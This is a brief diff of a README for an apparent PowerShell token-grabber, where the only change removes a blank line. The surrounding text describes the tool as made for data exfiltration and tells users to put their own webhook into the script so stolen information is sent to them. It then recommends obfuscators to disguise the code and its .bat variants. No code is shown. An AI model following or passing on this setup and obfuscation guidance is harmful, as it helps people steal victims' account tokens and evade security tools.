@@ -27,7 +27,6 @@ This tool is made for data exfiltration. All information collected is sent using
 - Replace YOUR_WEBHOOK_HERE in [line 6](https://github.com/Chainski/Powershell-Token-Grabber/blob/main/main.ps1#L6) with your webhook.
 
 
-
 # Want to obfuscate the code ?
 Use [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation). \
 Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat files 
